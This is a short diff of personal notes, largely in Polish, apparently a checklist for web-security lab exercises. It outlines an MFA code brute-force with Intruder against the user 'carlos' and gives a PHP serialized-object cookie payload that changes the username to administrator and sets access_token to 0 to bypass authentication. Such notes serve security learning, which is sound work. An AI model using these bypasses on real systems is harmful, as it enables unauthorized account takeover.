@@ -7,4 +7,6 @@ wszystkie funkcjonalnosci do claude
 ciasteczka do claude > JWT? serialized obejct? 
 jeśli nic nie ma -> Host header (?) > nie wychodzi w skanie param miner, a /admin ma 404, ale nie znaczy że nie ma endpointu
 mfa > (w pierwszym requuescie login2) veryfi=carlos >  (w pierwszym requuescie login2) veryfi=carlos mfa=xxxx intruder 0000-9999, step1, min. digits4
-cookie > serialized object?
+serialized object > GET /admin Admin interface only available  > 
+             origina; O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"ns4hisz8wfus9knyhwa0prtm0ty36iai";}
+             payload O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
